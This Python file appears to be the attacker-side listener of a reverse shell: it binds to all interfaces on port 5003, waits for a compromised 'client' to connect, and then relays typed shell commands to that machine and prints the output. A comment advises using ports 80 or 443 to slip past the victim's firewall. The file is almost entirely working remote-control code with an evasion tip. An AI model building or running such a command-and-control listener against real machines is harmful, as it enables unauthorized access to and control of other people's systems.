'''''''''



'''''''''

import socket

SERVER_HOST = "0.0.0.0"  # Why 0.0.0.0 tho? Reachable at every IPs
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128  # 128KB is max size of messages

# separator string for sending 2 messages in 1 go
SEPARATOR = "<sep>"

# create a socket object
s = socket.socket()

# Set port 80(http) or 443(https) to bypass firewall restrictions of client

s.bind((SERVER_HOST, SERVER_PORT))

# Listening for connections
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT}    ...")

# accept all attempted connections
client_socket, client_address = s.accept()  # returns a new socket
print(f"{client_address[0]}:{client_address[1]} ... Connected!")


# Receiving the current working directory of the client
# Encode the message to bytes & send using client_socket
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory: ", cwd)

while True:
    # get command from input
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break  # if the command is exit, break out bruuh
    # get command results
    output = client_socket.recv(BUFFER_SIZE).decode()

    # split command output & current workgin directory
    results, cwd = output.split(SEPARATOR)

    # print out contents
    print(results)
